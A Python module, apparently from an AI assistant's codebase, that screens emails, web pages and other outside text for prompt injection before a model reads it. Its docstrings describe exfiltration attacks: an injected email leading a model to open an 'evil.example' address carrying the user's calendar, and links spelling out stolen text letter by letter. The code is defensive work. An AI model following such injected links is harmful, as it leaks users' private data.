"""Outside text, read through the injection screen before a model sees it.

Each item a tool brings in from outside -- an email or a thread, a page, a
download, a shared document, a calendar entry someone else wrote, the
subject and preview the attention judge sees, a newsletter, the material of
mail sent to their agent -- goes through the screen (`core/screen.py`) before
a model reads it, and the model reads what the screen allows: the text as
it came, an extract of it when it carried text aimed at an AI, or a note
that it was withheld.

From 1 to 11 October 2026 the screen ran in shadow, in the background, so
that no reply waited for it. Now the read waits: a verdict that arrives
after the model has read the text protects nothing. It costs about 400 ms
the first time an item is read and nothing after, since a verdict is made
once per item.

On the event loop the screen runs in a thread, on a connection of its own
(`shown`); a thread that has its own connection -- the attention sources --
screens in place (`shown_here`). If the screen itself fails, the item is
withheld: a broken screen should be loud, not a quiet way round it.

Each read also marks the conversation in hand as having read outside text
(`Reading`), which from then on opens only the pages it was shown. And
every model tool says whether what it returns can carry outside text
(`OUTSIDE`, `OWN`): the wrapper each one is registered through marks the
conversation after a call of one that can (`read_through`), whatever the
tool did itself.
"""

from __future__ import annotations

import asyncio
import contextvars
import dataclasses
import logging
import re
import sqlite3
import time
from urllib.parse import urlsplit

from core import egress, screen

log = logging.getLogger("screen")

# The sites' titles and snippets that a web search returns, read before
# anything of theirs: a conversation that has only searched stays free.
_LEAVES_FREE = frozenset({"search_results"})


@dataclasses.dataclass
class Reading:
    """What one conversation has read from outside: whether it has, and the
    addresses that came whole in what it read.

    A model fooled by an email could open an address carrying what it had
    read -- `https://evil.example/?q=<their calendar>` -- and only a run
    nobody watched kept to the pages it was shown. A watched conversation
    now does too once it has read outside text (`toolset/web.py`
    `unshown`), for the rest of the conversation: its next turn still has
    the email in front of it (`history._kept`, `context._recent`). An address
    that came whole in what it read carries nothing of theirs; one the model
    wrote could.

    It keeps the words the user wrote in it too: once it has read outside
    text, a site's search box takes only those (`toolset/browser.py`
    `browse_search`), since typing into a page sends what is typed to its
    site, and a page can call any field a search box.

    An address that came whole carries nothing on its own, but a run of
    them can: a page or an email listing one link per letter spells out
    what the conversation read in the order the model opens them. So it
    opens at most `WHOLE_PER_HOST` of them on one site (`spelled`) before
    the user is asked (`toolset/web.py` `allow_links`); the addresses the
    user wrote count against nothing.

    One object, shared through `reading`, because each tool call runs as a
    task of its own: a flag set inside one call would be lost to the next."""

    read: bool = False
    urls: set[str] = dataclasses.field(default_factory=set)
    words: set[str] = dataclasses.field(default_factory=set)
    # `egress.normal` spellings: what came whole in what it read, what the
    # user wrote, and what of the first it has opened, per site.
    whole: set[str] = dataclasses.field(default_factory=set)
    said: set[str] = dataclasses.field(default_factory=set)
    opened: dict[str, set[str]] = dataclasses.field(default_factory=dict)

    def heard(self, text: str) -> None:
        """The user's own words: a link they paste may be opened, and a
        search may type what they wrote, whatever was read before."""
        found = egress.urls_in(text)
        self.urls |= found
        self.said |= {egress.normal(u) for u in found}
        self.words |= _words(text)

    def came(self, urls) -> None:
        """Addresses that came whole in what it read: shown, and counted."""
        found = {str(u) for u in urls if u}
        self.urls |= found
        self.whole |= {egress.normal(u) for u in found}


# How many addresses that came whole in what a conversation read it opens on
# one site before it asks (step 11's audit, A6): enough to follow a link or
# two from an email or a page, too few to spell anything.
WHOLE_PER_HOST = 3
# How long their yes to more of one site's addresses lasts, as a login's does
# (`agent/browser/session.LOGIN_APPROVAL_S`).
ALLOWED_S = 1800
_allowed: dict[tuple[int, str], float] = {}


# The conversation whose turn is running (`loop.Conversation.send`), or None.
reading: contextvars.ContextVar[Reading | None] = contextvars.ContextVar("reading",
                                                                         default=None)


def note(source: str, text, how: str = "text") -> None:
    """Marks the conversation in hand as having read `text` from outside,
    and keeps the addresses in it. Outside a conversation it does nothing.

    A search leaves it free only when the screen passed its results: one
    that did not is outside text the model was steered by, if anything was."""
    now = reading.get()
    if now is None or (source in _LEAVES_FREE and how == "text"):
        return
    now.read = True
    now.came(egress.urls_in(str(text or "")))


def has_read() -> bool:
    """Whether the conversation in hand has read outside text."""
    now = reading.get()
    return now is not None and now.read


def _words(text: str) -> set[str]:
    return set(re.findall(r"\w+", str(text or "").casefold()))


def theirs(text: str) -> bool:
    """Whether every word of `text` is one the user wrote in the
    conversation in hand."""
    now = reading.get()
    return now is not None and _words(text) <= now.words


def came_whole(urls) -> None:
    """Counts the links on a page the screen passed whole as shown in the
    conversation in hand, as the addresses in any text it passed are
    (`note`): a click follows one (`toolset/browser.py` `browse_click`)."""
    now = reading.get()
    if now is not None:
        now.came(urls)


def site(url: str) -> str:
    """The site an address is on: its host's last two labels, so that
    a.evil.example and b.evil.example, which one owner names freely, are one."""
    try:
        host = urlsplit(url.strip()).hostname or ""
    except ValueError:
        host = ""
    return ".".join(host.lower().split(".")[-2:])


def spelled(url: str) -> str | None:
    """The site of `url`, when the conversation in hand has opened
    `WHOLE_PER_HOST` other addresses there that came whole in what it read
    and `url` came so too, unless the user wrote it; otherwise None, and
    `url` counts as opened."""
    now = reading.get()
    key = egress.normal(url)
    if now is None or key not in now.whole or key in now.said:
        return None
    opened = now.opened.setdefault(where := site(url), set())
    if key in opened or len(opened) < WHOLE_PER_HOST:
        opened.add(key)
        return None
    return where


def allow(conversation: int, where: str, seconds: float = ALLOWED_S) -> None:
    """Their yes to this conversation opening more of `where`'s addresses
    that came in what it read, for a while (`toolset/web.py` `allow_links`)."""
    _allowed[(conversation, where)] = time.monotonic() + seconds


def allowed(conversation: int, where: str) -> bool:
    return _allowed.get((conversation, where), 0.0) > time.monotonic()


# What each hand-written model tool (agent/toolset) returns: words someone
# other than the user may have written -- a sender, a site, whoever shares a
# file or sends an invitation, a meeting's other voices, or a model that read
# them -- or only the user's own words, Steve's and settings. Every tool is
# in one of the two (tests/gate/test_every_tool_is_classified.py). A
# module's and an MCP server's tools are outside text by what they are, and
# screen and mark through their own `_shown`.
#
# Each tool screened and marked by hand until step 11's audit, and nothing
# made a new one decide: Drive's file names and the people ledger's names and
# subjects reached a watched chat unscreened, and left it free to open any
# address. Declared, a tool is marked for by its wrapper (`read_through`);
# screening what it returns is still the tool's.
OUTSIDE = frozenset({
    # The web, and what was written from it.
    "web_search", "read_page", "search_and_read", "research", "news_summary",
    # Mail, the calendar and shared files.
    "search_email", "read_email", "email_thread",
    "calendar_agenda", "due_dates", "calendar_search",
    "search_drive", "read_drive_file", "read_spreadsheet",
    # A reply's subject is its sender's; and an event, after a change, as it
    # stands, whoever wrote it.
    "writing_style", "update_event",
    # People as their own mail names them.
    "who_is", "my_commitments",
    # A meeting's or a call's notes, summarised from what others said.
    "find_notes",
    # Kept from what turns read, or written by the night from pages.
    "recall",
    # What background work read and wrote down: a goal's sessions, a crew's
    # workers.
    "goal_status", "wait_for_workers", "stop_worker",
    # The browser's pages and downloads, and LinkedIn's, through it.
    "browse_open", "browse_login", "browse_read", "browse_click", "browse_scroll",
    "browse_back", "browse_screenshot", "browse_search", "browse_files", "read_download",
    "browse_upload", "browse_submit",
    "linkedin_profile", "linkedin_search_people", "linkedin_company", "linkedin_jobs",
})
OWN = frozenset({
    # Writes, and what they say they did.
    "remember", "send_email", "draft_email", "delete_draft", "send_draft", "modify_email",
    "create_event", "delete_event", "create_document", "create_spreadsheet",
    "update_spreadsheet", "commitment_done", "add_task", "complete_task",
    "remind_me", "keep_checking", "cancel_reminder", "create_routine", "pause_routine",
    "cancel_routine", "start_goal", "answer_goal", "pause_goal", "drop_goal",
    "goal_update", "follow_news", "unfollow_news", "revoke_skill",
    "raise_spending_cap", "lower_spending_cap", "note_feedback", "build_module",
    # What the user set, or said, read back: the gaps in their day, their
    # tasks list, reminders, routines, topics and caps. A skill is written
    # from their own words, or is a module's, screened when the user turned
    # it on, as the module's words in every prompt are (agent/modtext.py).
    "calendar_free", "list_tasks", "list_reminders", "list_routines", "followed_news",
    "spending_caps", "use_skill", "list_skills",
    # The forecast's numbers, in Steve's words, and the weather service's
    # alerts; code the model wrote, run with no network (one with a network
    # is a card).
    "weather", "run_code",
    # Steve's own steps.
    "escalate", "defer_to_background", "take_notes", "talk_it_through",
    "browse_use_login", "allow_links", "browse_close", "start_worker", "start_browsing_worker",
})

# Outside text whose marking is left to the tool, rather than done after
# every call:
# - `web_search`: the sites' titles and snippets, read before anything of
#   theirs, leave the conversation free while the screen passes them, and
#   mark it when it does not (`note`, `_LEAVES_FREE`).
# - `recall`: the facts and notes kept, some of them from what a turn read
#   (agent/toolset/memory.py `keep_fact`) or from what the night read. It
#   marks nothing yet: the house prompt has it asked in most conversations
#   (agent/prompts/system.md, Memory), the same facts reach every turn
#   unasked, and marking it would close the web to most chats. The
#   maintainer's to decide.
# - `calendar_agenda`, `calendar_search`: an event someone else organised is
#   screened, which marks the conversation and counts the addresses it
#   passed as shown (`calendar._screened`); the user's own events are their
#   words, and leave it free. Marked after every call, an agenda of the
#   user's own events would close the links in them to the conversation.
LEFT_TO_THE_TOOL = frozenset({"web_search", "recall", "calendar_agenda", "calendar_search"})


def read_through(tool: str) -> None:
    """Marks the conversation in hand as having read outside text, after a
    call of `tool`, if it returns it (`OUTSIDE`). Outside a conversation,
    or for any other tool, it does nothing.

    The read alone, never the addresses: an address counts as shown only
    when it came whole in what the screen let through (`note`), and this
    has not read the result."""
    now = reading.get()
    if now is not None and tool in OUTSIDE and tool not in LEFT_TO_THE_TOOL:
        now.read = True

# What stays of an email the screen did not pass as it came: where it sits
# and when it arrived -- never a field its sender wrote. Where it sits is
# its account (`toolset.mail.shown`); this kept `mailbox`, the field it had
# before the mail tools moved onto the slot, and a withheld email lost which
# account to reply from.
_MAIL_KEEPS = ("id", "thread_id", "internal_date", "account", "folder", "labels", "unread",
               "body_from", "body_truncated", "body_length", "more")


def _read(conn: sqlite3.Connection | None, artifact: screen.Artifact) -> screen.Shown:
    """The one way to the screen. Never raises. tests/unit/conftest.py lets
    text through here, so a unit test reads what it planted; a test of the
    screening brings the real one back."""
    try:
        return screen.read(conn, artifact)
    except Exception:  # noqa: BLE001 - a broken screen withholds; it never lets through
        log.warning("could not screen %s %s", artifact.source, artifact.source_id[:60],
                    exc_info=True)
        return screen.Shown(screen.withheld(artifact, "could not be screened"), "withheld")


def _artifact(source: str, source_id, origin, text) -> screen.Artifact:
    return screen.Artifact(source, str(source_id or ""), str(origin or ""), str(text or ""))


def shown_here(conn: sqlite3.Connection | None, source: str, source_id, origin,
               text) -> screen.Shown:
    """What a model may read of one item, screened in place: for a thread
    with a connection of its own. Blocking."""
    seen = _read(conn, _artifact(source, source_id, origin, text))
    note(source, seen.text, seen.how)
    return seen


async def shown(conn: sqlite3.Connection | None, source: str, source_id, origin,
                text) -> screen.Shown:
    """What a model may read of one item, screened in a thread, on its own
    connection, while the caller waits."""
    artifact = _artifact(source, source_id, origin, text)
    if not artifact.text.strip():
        return screen.Shown(artifact.text, "text")
    if conn is None:
        seen = await asyncio.to_thread(_read, None, artifact)
    else:
        from agent import offloop

        seen = await offloop.with_own_conn(conn, _read, artifact)
    note(source, seen.text, seen.how)
    return seen


async def page(conn: sqlite3.Connection | None, read, source: str = "web_page"):
    """A page read (`tools.web.PageContent`) as a model may read it: as it
    came, or with its title dropped and its text replaced by what the screen
    allows. A page that was not read has nothing to screen."""
    if read.error or not read.text:
        return read
    from urllib.parse import urlsplit

    seen = await shown(conn, source, read.url, urlsplit(read.url).hostname,
                       f"{read.title or ''}\n\n{read.text}")
    return read if seen.how == "text" else dataclasses.replace(read, title=None,
                                                               text=seen.text)


def preview_text(message: dict) -> str:
    """An email as its preview shows it: who sent it, its subject and its
    snippet, all of them its sender's words. One text for the attention
    loop's new mail and for a search's results, so one screening serves
    both."""
    snippet = str(message.get("snippet") or "").strip()[:300]
    return (f"From: {message.get('from') or 'unknown'}\n"
            f"Subject: {message.get('subject') or '(no subject)'}\n{snippet}")


def _mail_text(message: dict) -> str:
    return (f"From: {message.get('from') or ''}\nSubject: {message.get('subject') or ''}"
            f"\n\n{message.get('body') or ''}")


async def mail(conn: sqlite3.Connection | None, message: dict) -> dict:
    """A received email as a model may read it: as it came, or, if the
    screen did not pass it, where it sits and when it came, with what the
    screen allows in place of everything its sender wrote. A failed read has
    nothing to screen."""
    if not isinstance(message, dict) or message.get("error"):
        return message
    seen = await shown(conn, "email_body", message.get("id"), message.get("from"),
                       _mail_text(message))
    if seen.how == "text":
        return message
    return {**{k: message[k] for k in _MAIL_KEEPS if k in message},
            "screened": seen.how, "body": seen.text}
